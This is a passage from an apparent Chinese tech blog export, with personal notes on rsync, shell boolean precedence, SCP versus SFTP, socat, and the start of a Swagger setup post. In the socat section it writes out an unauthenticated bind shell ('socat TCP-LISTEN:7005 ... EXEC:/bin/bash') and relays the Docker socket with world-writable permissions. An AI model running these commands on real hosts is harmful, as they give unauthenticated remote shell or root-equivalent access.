target=\"_blank\" rel=\"noopener\">SCP 和 Rsync 远程拷贝的几个技巧 - 散尽浮华 - 博客园</a><br><a href=\"https://www.cnblogs.com/leestar54/p/6625235.html#wiz_toc_11\" target=\"_blank\" rel=\"noopener\">使用 WinSCP 进行简单代码文件同步 - leestar54 - 博客园</a><br><a href=\"https://winscp.net/eng/docs/ui_synchronize\" target=\"_blank\" rel=\"noopener\">Synchronize Dialog :: WinSCP</a><br><a href=\"https://winscp.net/eng/docs/scripting\" target=\"_blank\" rel=\"noopener\">Scripting and Task Automation :: WinSCP</a><br><a href=\"https://mga8326.blogspot.com/2018/08/rsync.html\" target=\"_blank\" rel=\"noopener\">厭世人生的 MIS 記事本: rsync 參數 用法</a><br><a href=\"https://www.jianshu.com/p/52aa5c2b872a\" target=\"_blank\" rel=\"noopener\">SSH,SCP,rsync,sftp - 简书</a><br><a href=\"https://serverfault.com/questions/378939/do-you-need-e-ssh-for-rsync\" target=\"_blank\" rel=\"noopener\">backup - Do you need -e ssh for rsync? - Server Fault</a><br><a href=\"http://newsletter.ascc.sinica.edu.tw/news/read_news.php?nid=1742\" target=\"_blank\" rel=\"noopener\">詳全文_資料備份同步工具簡介— rsync</a><br><a href=\"https://blog.longwin.com.tw/2005/12/rsync_ssh_backup/\" target=\"_blank\" rel=\"noopener\">rsync 備份 | Tsung’s Blog</a><br><a href=\"https://www.opencli.com/linux/rsync-local-remote-backup\" target=\"_blank\" rel=\"noopener\">Rsync 備份本地及遠端目錄</a></p>\n<p><a href=\"https://www.maketecheasier.com/remove-user-hostname-terminal-prompt/\" target=\"_blank\" rel=\"noopener\">How to Remove User and Hostname in Terminal Prompt - Make Tech Easier</a></p>\n<p>date: 2019-03-31</p>\n<p>最近在 window 使用 rsync<br>結果發現他還是全部檔案會傳上去<br>Google 一下，發現要加<code>--modify-window=1</code><del>才能解決全部上傳問題</del>我自己電腦測試失敗…<br>但發現可能是我在 linux 做<code>chmod o+rx -R .</code>關係，因為剛開始複製是<code>750</code><br>晚點看看<code>--chmod=755</code>能否解決?</p>\n<p>但原始資料來源，做 rsync 好像正常…<br>有看到用<code>--size-only</code>但這也不是最好的同步方式<br>難免改檔案大小都一樣</p>\n<ul>\n<li><a href=\"https://codeday.me/bug/20181107/355365.html\" target=\"_blank\" rel=\"noopener\">–checksum 和–ignore-times 选项之间的 Rsync 差异 - 代码日志</a></li>\n<li><a href=\"https://www.rootopen.com/command/view/5b28ae76d678fd520c7275dc\" target=\"_blank\" rel=\"noopener\">将使用 rsync 增量的文件备份到 NTFS 分区 Backup files incremental with rsync to a NTFS-Partition-rootopen.com</a></li>\n<li><a href=\"http://chengkinhung.blogspot.com/2012/09/linuxrsyncdebug.html\" target=\"_blank\" rel=\"noopener\">Linux 命令：Rsync 常见问题之 Debug | Jason’s Blog</a></li>\n<li><a href=\"http://webmotociclismo.com/questions/222/ru-he-zai-fatwen-jian-xi-tong-zhong-shi-yong-rsync\" target=\"_blank\" rel=\"noopener\">如何在 FAT 文件系统中使用 rsync？ | webmotociclismo.com</a></li>\n<li><a href=\"https://www.weiyeying.com/ask/4130673\" target=\"_blank\" rel=\"noopener\">一千萬個為什麽 | 僅在從 ext4 同步到 NTFS 時顯示已更改的文件</a></li>\n<li><a href=\"https://www.google.com/search?client=firefox-b-d&amp;ei=GICgXIeLPMj-8gXliLSIDg&amp;q=chmod+rsync&amp;oq=chmod+rsync&amp;gs_l=psy-ab.3..0i203j0i8i30l9.1489.5065..5199...1.0..0.70.595.11......0....1..gws-wiz.......0i71j0i67j0j0i13j0i30.50ZRAKl16jw\" target=\"_blank\" rel=\"noopener\">chmod rsync - Google 搜尋</a></li>\n<li><a href=\"http://idannow.blogspot.com/2013/03/windows.html\" target=\"_blank\" rel=\"noopener\">就是愛點鬧: Windows 下好用的檔案同步工具</a></li>\n<li>[【 Linux 】檔案同步工具 rsync 指令 - 亞索數位筆記](<a href=\"https://blog.aiso.idv.tw/\" target=\"_blank\" rel=\"noopener\">https://blog.aiso.idv.tw/</a></li>\n<li><a href=\"http://www.blogjava.net/lsbwahaha/archive/2010/02/03/311812.html\" target=\"_blank\" rel=\"noopener\">介绍 rsync 同步工具配置与使用，linuxlinux, linuxwindows(cwRsync) - lsbwahaha - BlogJava</a></li>\n<li><a href=\"https://blog.yumc.pw/posts/Rsync-Usage/\" target=\"_blank\" rel=\"noopener\">rsync 使用简介 | 喵 ♂ 呜 的博客</a></li>\n<li><a href=\"http://landcareweb.com/questions/3793/rsync-size-onlyhe-ignore-timeszhi-jian-de-qu-bie\" target=\"_blank\" rel=\"noopener\">rsync：–size-only 和–ignore-times 之间的区别 | landcareweb.com</a></li>\n<li><a href=\"https://codeday.me/bug/20170724/45245.html\" target=\"_blank\" rel=\"noopener\">rsync：–size-only 和–ignore-times 之间的差异 - 代码日志</a></li>\n<li><a href=\"https://codeday.me/bug/20181107/355365.html\" target=\"_blank\" rel=\"noopener\">–checksum 和–ignore-times 选项之间的 Rsync 差异 - 代码日志</a></li>\n<li><a href=\"https://question.itread01.com/fipeyp.html\" target=\"_blank\" rel=\"noopener\">「」checksum 和」ignore-times 選項之間的 Rsync 差異</a></li>\n<li><a href=\"https://codeday.me/bug/20181107/355365.html\" target=\"_blank\" rel=\"noopener\">–checksum 和–ignore-times 选项之间的 Rsync 差异 - 代码日志</a></li>\n</ul>\n<p>目前我有一隻 window-&gt;linux</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">rsync -vr --progress --chmod=755 ./local_path/ user@ip:/path</span><br></pre></td></tr></table></figure>\n<p>參考來源：</p>\n<ul>\n<li><a href=\"https://www.rootopen.com/command/view/5b28ae76d678fd520c7275dc\" target=\"_blank\" rel=\"noopener\">将使用 rsync 增量的文件备份到 NTFS 分区 Backup files incremental with rsync to a NTFS-Partition-rootopen.com</a></li>\n<li><a href=\"http://chengkinhung.blogspot.com/2012/09/linuxrsyncdebug.html\" target=\"_blank\" rel=\"noopener\">Linux 命令：Rsync 常见问题之 Debug | Jason’s Blog</a></li>\n<li><a href=\"http://webmotociclismo.com/questions/222/ru-he-zai-fatwen-jian-xi-tong-zhong-shi-yong-rsync\" target=\"_blank\" rel=\"noopener\">如何在 FAT 文件系统中使用 rsync？ | webmotociclismo.com</a></li>\n</ul>\n","categories":["Linux"],"tags":["winscp","scp","rsync"]},{"title":"shell script 布林運算順序","url":"/blog/2019/11/06/shell-script-%E5%B8%83%E6%9E%97%E9%81%8B%E7%AE%97%E9%A0%86%E5%BA%8F/","content":"<p>一般寫程式都有 not and or 順序去做運算<br>但今天我發現 shell script 運算結果跟(別的)程式結果不太一樣<br>查了一下發現，shell script 是由<code>左往右</code></p>\n<a id=\"more\"></a>\n<p>這邊就很清楚，說shell 布林運算都是<strong>左到右</strong></p>\n<blockquote>\n<p>In many computer languages, operators with the same precedence are left-associative. That is, in the absence of grouping structures, leftmost operations are executed first. Bash is no exception to this rule.<br>This is important because, in Bash, &amp;&amp; and || have the same precedence.<br>So what happens in your example is that the leftmost operation (||) is carried out first:<br>…<br><a href=\"https://unix.stackexchange.com/questions/88850/precedence-of-the-shell-logical-operators\" target=\"_blank\" rel=\"noopener\">bash - Precedence of the shell logical operators &amp;&amp;, || - Unix &amp; Linux Stack Exchange</a></p>\n</blockquote>\n<h2 id=\"if-多條件-boolean-寫法\"><a href=\"#if-多條件-boolean-寫法\" class=\"headerlink\" title=\"if 多條件 boolean 寫法\"></a>if 多條件 boolean 寫法</h2><p>可用 &amp;&amp; , ||</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> [ -e <span class=\"variable\">$xxxx</span> ] || [ -e <span class=\"variable\">$oooo</span> ] &amp;&amp; [ -e <span class=\"variable\">$dddd</span> ] &amp;&amp; [  -e <span class=\"variable\">$eeee</span> ]</span><br><span class=\"line\"><span class=\"keyword\">then</span></span><br><span class=\"line\">    ....</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    ....</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br></pre></td></tr></table></figure>\n<p>可用 bash <code>[[</code> 和 <code>]]</code>調整順序<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> [ -e <span class=\"variable\">$dddd</span> ] &amp;&amp; [  -e <span class=\"variable\">$eeee</span> ] &amp;&amp; [[ -e <span class=\"variable\">$xxxx</span>  ||  -e <span class=\"variable\">$oooo</span> ]] </span><br><span class=\"line\"><span class=\"keyword\">then</span></span><br><span class=\"line\">    ....</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    ....</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br></pre></td></tr></table></figure></p>\n<p>發現 sh 也可以用 <code>(</code> <code>)</code><br><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> [ -e <span class=\"variable\">$dddd</span> ] &amp;&amp; [  -e <span class=\"variable\">$eeee</span> ] &amp;&amp; ([ -e <span class=\"variable\">$xxxx</span> ] || [ -e <span class=\"variable\">$oooo</span> ]) </span><br><span class=\"line\"><span class=\"keyword\">then</span></span><br><span class=\"line\">    ....</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    ....</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br></pre></td></tr></table></figure></p>\n<p>還可以這樣用<code>-o</code> <code>-a</code></p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> [ -e <span class=\"variable\">$dddd</span> ] &amp;&amp; [  -e <span class=\"variable\">$eeee</span> ] &amp;&amp; [ -e <span class=\"variable\">$xxxx</span> -o -e <span class=\"variable\">$oooo</span> ]</span><br><span class=\"line\"><span class=\"keyword\">then</span></span><br><span class=\"line\">    ....</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    ....</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br></pre></td></tr></table></figure>\n<p>參考連結:</p>\n<p><a href=\"https://stackoverflow.com/questions/16203088/bash-if-statement-with-multiple-conditions-throws-an-error\" target=\"_blank\" rel=\"noopener\">Bash if statement with multiple conditions throws an error - Stack Overflow</a><br><a href=\"https://stackoverflow.com/questions/23542574/multiple-conditions-in-if-statement-shell-script\" target=\"_blank\" rel=\"noopener\">Multiple conditions in if statement shell script - Stack Overflow</a><br><a href=\"https://stackoverflow.com/questions/20449680/boolean-operators-a-o-in-bash\" target=\"_blank\" rel=\"noopener\">shell - Boolean operators ( &amp;&amp;, -a, ||, -o ) in Bash - Stack Overflow</a><br><a href=\"https://stackoverflow.com/questions/3826425/how-to-represent-multiple-conditions-in-a-shell-if-statement\" target=\"_blank\" rel=\"noopener\">bash - How to represent multiple conditions in a shell if statement? - Stack Overflow</a></p>\n<h2 id=\"彩蛋\"><a href=\"#彩蛋\" class=\"headerlink\" title=\"彩蛋\"></a>彩蛋</h2><p><a href=\"https://jimmysong.io/posts/vagrant-intro/\" target=\"_blank\" rel=\"noopener\">Vagrant介绍-从使用到放弃再到掌握完全指南 - 宋净超的博客|Cloud Native|云原生布道师</a><br><a href=\"https://stackoverflow.com/questions/23747612/how-do-you-break-an-array-in-groups-of-n\" target=\"_blank\" rel=\"noopener\">bash - How do you break an array in groups of n - Stack Overflow</a></p>\n<p>比較檔案是否一致<br><a href=\"https://stackoverflow.com/questions/12900538/fastest-way-to-tell-if-two-files-are-the-same-in-unix-linux\" target=\"_blank\" rel=\"noopener\">Fastest way to tell if two files are the same in Unix/Linux? - Stack Overflow</a></p>\n","categories":["Linux"],"tags":["shell"]},{"title":"scp跟sftp是不一樣的東西","url":"/blog/2018/04/16/scp%E8%B7%9Fsftp%E6%98%AF%E4%B8%8D%E6%A8%A3%E7%9A%84%E6%9D%B1%E8%A5%BF/","content":"<p>最近在公司做使用PHP做sftp傳輸上去<br>結果一直出問題<br>使用<code>ssh2_scp_send</code>傳輸檔案<br>公司內部測試可以傳檔案<br>但別的主機卻不能</p>\n<a id=\"more\"></a>\n<p>我在我的主機安裝ssh2環境（改天來補筆記）<br>發現還是不能連到那台</p>\n<p>後來我決定，試著打 sftp command line連過去<br>看到顯示<code>freeFTPd</code>，我就找相關資料<br>freeFTPd是window平台，可以免費架設sftp/ftp東西<br>不過我爬到…</p>\n<blockquote>\n<p>SFTP 雖然提供了一個安全可靠的傳送渠道，但是SFTP不能直接用瀏覽器開啟。需要使用支援SFTP的軟件才能進入SFTP Server，例如CuteFTP、WinSCP、或者Client Side的FileZilla。還有，freeFTPd的SFTP是不能用SSH登入及使用SCP傳送檔案的。<br><a href=\"https://yzl1218.tian.yam.com/posts/62969137\" target=\"_blank\" rel=\"noopener\">在Windows下使用freeFTP來架設SFTP Server &amp; 我是我，葉子 - yzl1218 # 天空部落 TIAN #</a></p>\n</blockquote>\n<p>有找到使用<code>copy(&quot;ssh2.sftp://{$ftp_IP}&quot;.$remote, $local);</code>就可以用了<br><a href=\"http://blog.51cto.com/11760810/2044534\" target=\"_blank\" rel=\"noopener\">PHP-sftp文件上传-11750810-51CTO博客</a></p>\n<p>我一直以為SCP跟SFTP是差不多東西<br>但結果證明是不一樣的<br>SCP沒有續傳功能，有點類似做<code>cp</code>指令動作透過ssh</p>\n<blockquote>\n<p>sftp是基於ftp使用ssh<br>SCP和CP命令相似，SFTP和FTP的使用方法也類似。SCP和SFTP的共同之處在於「使用SSH將文件加密才傳輸的」<br>使用「WinSCP」或者「FileZilla」之類的客戶端，還可以和Windows之間進行文件傳輸。 </p>\n</blockquote>\n<blockquote>\n<p>SCP和SFTP的不同之處，首先就是之前提到的，SCP使用「SCP命令」，SFTP則類似「FTP處理文件」的使用方式。<br>它們的不同之處還不止如此，還有「SCP比較簡單，是輕量級的，SFTP的功能則比較多」。<br>詳細說的話，雖然還有很多不同之處，但2者的最大不同之處在於「SFTP在文件傳輸過程中中斷的話，連接後還可以繼續傳輸，但SCP不行」。<br><a href=\"http://wb8206656.iteye.com/blog/2231060\" target=\"_blank\" rel=\"noopener\">SCP和SFTP區別 - - ITeye博客</a></p>\n</blockquote>\n<p>經過這次….<br>下次應該不會再踩這個雷了吧</p>\n","categories":["程式心法"],"tags":["scp","sftp"]},{"title":"socat 實用網路工具 和 使用解析 unix socket 方法","url":"/blog/2020/02/14/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/","content":"<p>最近要看 unix socket 傳送資料而苦惱<br>剛好最近這個工具<a href=\"https://plantegg.github.io/2019/04/04/%E5%B0%B1%E6%98%AF%E8%A6%81%E4%BD%A0%E6%87%82%E6%8A%93%E5%8C%85--Unix-Socket%E6%8A%93%E5%8C%85/\" target=\"_blank\" rel=\"noopener\">就是要你懂Unix Socket 进行抓包解析 | plantegg</a><br>馬上實作看看!!!</p>\n<a id=\"more\"></a>\n<h2 id=\"簡單介紹\"><a href=\"#簡單介紹\" class=\"headerlink\" title=\"簡單介紹\"></a>簡單介紹</h2><p><strong>So</strong>cket <strong>cat</strong> 是一個比 netcat(nc) 強大工具。 nc 我沒怎麼使用過，不過直接先跳學 socat 使用好像也不錯，感覺比 nc 簡單。</p>\n<h2 id=\"首先怎麼抓到-unix-socket\"><a href=\"#首先怎麼抓到-unix-socket\" class=\"headerlink\" title=\"首先怎麼抓到 unix socket\"></a>首先怎麼抓到 unix socket</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo mv /var/run/docker.sock /var/run/docker.sock.original</span><br><span class=\"line\">sudo socat TCP-LISTEN:8089,reuseaddr,fork UNIX-CONNECT:/var/run/docker.sock.original</span><br><span class=\"line\">sudo socat UNIX-LISTEN:/var/run/docker.sock,fork TCP-CONNECT:127.0.0.1:8089</span><br></pre></td></tr></table></figure>\n<p><strong>以下是我想的流程，未必正確</strong><br>上方實作 socket ，正常流程</p>\n<ol>\n<li><p>socket server 會做 等待接收資料(stdin)<br>client端: clinet socket (stdin) —&gt; server socket (對 client 來說是 stdout,server 來說是 stdin)</p>\n</li>\n<li><p>Server接到完資料，經過程式處理，會回傳資料到client<br>Server端: server socket (stdin) —&gt; client socket (對 server 來說是 stdout,client 來說是 stdin)</p>\n</li>\n</ol>\n<p>所以正常應該會有來回資料</p>\n<p>用上面方法，我發現 docker 怎麼沒有 docker 容器跑出來結果<code>docker run ubuntu echo hello</code><br>經過一番測試</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo mv /var/run/docker.sock /var/run/docker.sock.original</span><br><span class=\"line\">sudo socat -t100 -d -x -v UNIX-LISTEN:/var/run/docker.sock,mode=777,reuseaddr,fork UNIX-CONNECT:/var/run/docker.sock.original</span><br></pre></td></tr></table></figure>\n<p>用以上參數可以正常看到執行結果，又在想他有做轉發應該都會來回，應該可以做顯示<br>發現多了<code>-t100 -d -x -v</code>可以顯示結果<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo mv /var/run/docker.sock /var/run/docker.sock.original</span><br><span class=\"line\">sudo socat -t100 -d -x -v TCP-LISTEN:8089,reuseaddr,fork UNIX-CONNECT:/var/run/docker.sock.original</span><br><span class=\"line\">sudo socat -t100 -d -x -v UNIX-LISTEN:/var/run/docker.sock,fork TCP-CONNECT:127.0.0.1:8089</span><br></pre></td></tr></table></figure></p>\n<p>這樣就正常了</p>\n<p><code>-t&lt;timeout&gt;</code><br>沒想到是跟這個有關係，設定-t100 就能顯示</p>\n<blockquote>\n<p>When one channel has reached EOF, the write part of the other channel is shut down. Then, socat waits <timeout> [timeval] seconds before terminating.  Default  is  0.5  seconds.<br>This  timeout only applies to addresses where write and read part can be closed independently. When during the timeout interval the read part gives EOF, socat terminates without   awaiting the timeout.</timeout></p>\n</blockquote>\n<p><code>-v</code> http 的話可服選擇這種方式去顯示記錄<br><code>-x</code> 也是顯示封包格式</p>\n<h2 id=\"相關指令\"><a href=\"#相關指令\" class=\"headerlink\" title=\"相關指令\"></a>相關指令</h2><h3 id=\"讀寫文件\"><a href=\"#讀寫文件\" class=\"headerlink\" title=\"讀寫文件\"></a>讀寫文件</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">socat - /xxx/note.txt</span><br><span class=\"line\">socat - ./note.txt</span><br></pre></td></tr></table></figure>\n<p>我一直搞不懂 - 意思<br>不過 第二個 address 是 STDOUT 突然就好懂了<br>不知道<code>-</code>是不是呼略的意思?</p>\n<p>通常 socat [ option ] address1 address2</p>\n<p>address1-&gt;address2</p>\n<h3 id=\"開-port-通訊\"><a href=\"#開-port-通訊\" class=\"headerlink\" title=\"開 port 通訊\"></a>開 port 通訊</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># command a window</span></span><br><span class=\"line\">socat TCP-LISTEN:7000 -        </span><br><span class=\"line\"><span class=\"comment\"># command b window</span></span><br><span class=\"line\">socat - TCP:127.0.0.1:7000</span><br></pre></td></tr></table></figure>\n<p>### </p>\n<h1 id=\"在服務端-7005-端口建立一個-Shell。\"><a href=\"#在服務端-7005-端口建立一個-Shell。\" class=\"headerlink\" title=\"在服務端 7005 端口建立一個 Shell。\"></a>在服務端 7005 端口建立一個 Shell。</h1><p>server<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ socat TCP-LISTEN:7005,fork,reuseaddr EXEC:/bin/bash,pty,stderr</span><br><span class=\"line\">或者</span><br><span class=\"line\">$ socat TCP-LISTEN:7005,fork,reuseaddr system:bash,pty,stderr</span><br></pre></td></tr></table></figure></p>\n<p>client</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 連接到服務器的 7005 端口，即可獲得一個 Shell。readline 是 GNU 的命令行編輯器，具有歷史功能。</span><br><span class=\"line\">$ socat readline tcp:127.0.0.1:7005</span><br></pre></td></tr></table></figure>\n<h4 id=\"我的ubuntu-不能用-readline\"><a href=\"#我的ubuntu-不能用-readline\" class=\"headerlink\" title=\"我的ubuntu 不能用 readline\"></a>我的ubuntu 不能用 readline</h4><blockquote>\n<p>問題: ubuntu下，按照官方文檔，客戶端執行socat readline tcp:serverip:12345，出現錯誤提示：socat[2067] E unknown device/address “READLINE”，本機上已經安裝readline相關庫。</p>\n</blockquote>\n<h3 id=\"文件傳送\"><a href=\"#文件傳送\" class=\"headerlink\" title=\"文件傳送\"></a>文件傳送</h3><p>服務端</p>\n<p>socat -u open:filename,binary tcp-listen:12345</p>\n<p>客戶端</p>\n<p>socat -u tcp:serverip:12345 open:localfilename,create,binary</p>\n<h3 id=\"讀寫分離\"><a href=\"#讀寫分離\" class=\"headerlink\" title=\"讀寫分離\"></a>讀寫分離</h3><p>socat支持打開端的讀寫分離，使用!!符號，左側表示讀，右側表示寫。</p>\n<p>socat open:hello.html!!open:log.txt,create,append tcp-listen:12345,reuseaddr,fork</p>\n<p>說明</p>\n<p>open:hello.html 表示讀hello.html文件。<br>open:log.txt 表示收到的數據寫入log.txt文件。<br>reuseaddr 見socket的SO_REUSEADDR。<br>fork 請求到達時，fork一個進程進行處理。<br>在bash下，需要用\\對!進行轉義。</p>\n<p>參考:<a href=\"https://www.cnblogs.com/SZLLQ2000/p/8591405.html\" target=\"_blank\" rel=\"noopener\">socat - szllq2000 - 博客园</a></p>\n<h3 id=\"通過-OPENSSL-加密傳送\"><a href=\"#通過-OPENSSL-加密傳送\" class=\"headerlink\" title=\"通過 OPENSSL 加密傳送\"></a>通過 OPENSSL 加密傳送</h3><p>參考: <a href=\"https://www.hi-linux.com/posts/61543.html\" target=\"_blank\" rel=\"noopener\">Socat 入門教程 - 運維之美</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 為服務端的證書取一個基本的名字。</span></span><br><span class=\"line\">FILENAME=server</span><br><span class=\"line\"><span class=\"comment\"># 生成公鑰私鑰對。</span></span><br><span class=\"line\">openssl genrsa -out <span class=\"variable\">$FILENAME</span>.key 1024</span><br><span class=\"line\"><span class=\"comment\"># 生成一個自簽名的證書，會提示你輸入國家代號、姓名等，或者按下回車鍵跳過輸入提示。</span></span><br><span class=\"line\">openssl req -new -key <span class=\"variable\">$FILENAME</span>.key -x509 -days 3653 -out <span class=\"variable\">$FILENAME</span>.crt</span><br><span class=\"line\"><span class=\"comment\"># 用剛生成的密鑰文件和證書文件來生成PEM文件。</span></span><br><span class=\"line\">cat <span class=\"variable\">$FILENAME</span>.key <span class=\"variable\">$FILENAME</span>.crt &gt;<span class=\"variable\">$FILENAME</span>.pem</span><br></pre></td></tr></table></figure>\n<p>client<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">FILENAME=client</span><br><span class=\"line\"><span class=\"comment\"># 生成公鑰私鑰對。</span></span><br><span class=\"line\">openssl genrsa -out <span class=\"variable\">$FILENAME</span>.key 1024</span><br><span class=\"line\"><span class=\"comment\"># 生成一個自簽名的證書，會提示你輸入國家代號、姓名等，或者按下回車鍵跳過輸入提示。</span></span><br><span class=\"line\">openssl req -new -key <span class=\"variable\">$FILENAME</span>.key -x509 -days 3653 -out <span class=\"variable\">$FILENAME</span>.crt</span><br><span class=\"line\"><span class=\"comment\"># 用剛生成的密鑰文件和證書文件來生成PEM文件。</span></span><br><span class=\"line\">cat <span class=\"variable\">$FILENAME</span>.key <span class=\"variable\">$FILENAME</span>.crt &gt;<span class=\"variable\">$FILENAME</span>.pem</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"憑證問題\"><a href=\"#憑證問題\" class=\"headerlink\" title=\"憑證問題\"></a>憑證問題</h3><blockquote>\n<p> 如果出现异常 2016/12/15 17:49:50 socat[8259] E certificate is valid but its commonName does not match hostname<br> 可使用 verify=0 关闭验证<br> 或者添加 commonname</p>\n</blockquote>\n<p>參考: <a href=\"http://wener.me/notes/ops/network/tool/intro/\" target=\"_blank\" rel=\"noopener\">网络相关工具集</a></p>\n<h2 id=\"如何監聽-port-抓-GET-POST-封包\"><a href=\"#如何監聽-port-抓-GET-POST-封包\" class=\"headerlink\" title=\"如何監聽 port 抓 GET POST 封包\"></a>如何監聽 port 抓 GET POST 封包</h2><h3 id=\"Wireshark\"><a href=\"#Wireshark\" class=\"headerlink\" title=\"Wireshark\"></a>Wireshark</h3><p><a href=\"https://sls.weco.net/CollectiveNote20/Wireshark\" target=\"_blank\" rel=\"noopener\">0. 協定分析 : Wireshark | 宅學習</a></p>\n<p>http.request.method == “POST”<br><a href=\"https://stackoverflow.com/questions/3410505/sniff-http-packets-for-get-and-post-requests-from-an-application\" target=\"_blank\" rel=\"noopener\">wireshark - Sniff HTTP packets for GET and POST requests from an application - Stack Overflow</a></p>\n<h3 id=\"tcpdump\"><a href=\"#tcpdump\" class=\"headerlink\" title=\"tcpdump\"></a>tcpdump</h3><p>過濾 GET 請求:</p>\n<p>sudo tcpdump host 3sd.me and port 80 and ‘tcp[((tcp[12:1] &amp; 0xf0) &gt;&gt; 2):4] = 0x47455420’</p>\n<p>過濾 POST 請求：</p>\n<p>sudo tcpdump host 3sd.me and port 80 and ‘tcp dst port 80 and (tcp[((tcp[12:1] &amp; 0xf0) &gt;&gt; 2):4] = 0x504f5354)’</p>\n<p>參考:<br><a href=\"https://mozillazg.com/2015/05/open-tcpdump-result-with-wireshark-gui.html\" target=\"_blank\" rel=\"noopener\">使用 wireshark 查看 tcpdump 的抓包結果 - Huang Huang 的博客</a><br><a href=\"https://ssorc.tw/6553/%E4%BD%BF%E7%94%A8-tcpdump-%E6%8A%93%E5%8F%96-post-%E5%8B%95%E4%BD%9C%E7%9A%84%E5%85%A7%E5%AE%B9/\" target=\"_blank\" rel=\"noopener\">使用 tcpdump 抓取 POST 動作的 request 資料內容 | SSORC.tw</a></p>\n<h2 id=\"相關教學網站\"><a href=\"#相關教學網站\" class=\"headerlink\" title=\"相關教學網站\"></a>相關教學網站</h2><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/33306055\" target=\"_blank\" rel=\"noopener\">用ssh和socat分分钟搞定Linux各种端口转发 - 知乎</a></li>\n<li><a href=\"https://www.middlewareinventory.com/blog/tcpdump-capture-http-get-post-requests-apache-weblogic-websphere/\" target=\"_blank\" rel=\"noopener\">TCPDump Capture HTTP GET/POST requests - Apache, Weblogic &amp; Websphere</a></li>\n<li><a href=\"http://brieflyx.me/2015/linux-tools/socat-introduction/\" target=\"_blank\" rel=\"noopener\">SOCAT 简介 - BrieflyX’s Base</a></li>\n<li><a href=\"https://www.hi-linux.com/posts/61543.html\" target=\"_blank\" rel=\"noopener\">Socat 入门教程 - 运维之美</a></li>\n<li><a href=\"https://medium.com/@copyconstruct/socat-29453e9fc8a6\" target=\"_blank\" rel=\"noopener\">socat - Cindy Sridharan - Medium</a></li>\n<li><a href=\"https://www.cnblogs.com/young525/p/5873727.html\" target=\"_blank\" rel=\"noopener\">socat使用笔记 - young525 - 博客园</a></li>\n<li><a href=\"https://datahunter.org/socat\" target=\"_blank\" rel=\"noopener\">socat | 夢想家</a></li>\n<li><a href=\"https://blog.lilydjwg.me/tag/socat\" target=\"_blank\" rel=\"noopener\">依云’s Blog</a></li>\n<li><a href=\"https://wsgzao.github.io/post/tcpdump/\" target=\"_blank\" rel=\"noopener\">tcpdump 抓包使用小结 | HelloDog</a></li>\n</ul>\n<h3 id=\"查詢到工具\"><a href=\"#查詢到工具\" class=\"headerlink\" title=\"查詢到工具\"></a>查詢到工具</h3><p>cat、netcat、rinetd、stunnel </p>\n<p>FRP<br><a href=\"https://mp.weixin.qq.com/s/8HeeDC5x5xozElN8GzQLLw\" target=\"_blank\" rel=\"noopener\">推荐一款很好用的内网穿透工具–FRP</a></p>\n<p>這篇算沒整理很好<br>很多網頁都整理不錯<br>大神們真的很厲害<br>我只能跪了</p>\n","categories":["Linux"],"tags":["linux","socat"]},{"title":"springframework3 with struts2 使用 swagger 工具注解使用","url":"/blog/2021/01/04/springframework3-with-struts2-%E4%BD%BF%E7%94%A8-swagger-%E5%B7%A5%E5%85%B7%E6%B3%A8%E8%A7%A3%E4%BD%BF%E7%94%A8/","content":"<p>搭在 spring 3 網路上很多教學都是使用 spring MVC 去做串接<br>由於公司上使用是舊版<br>所以找找有沒有能用的方法<br>最後成功來記錄一下</p>\n<a id=\"more\"></a>\n<h2 id=\"下載依賴\"><a href=\"#下載依賴\" class=\"headerlink\" title=\"下載依賴\"></a>下載依賴</h2><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>io.swagger<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>swagger-jersey2-jaxrs<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span> </span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.5.0<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>由於我專案沒有用 maven<br>所以…自己想辦法抓</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">mvn dependency:get 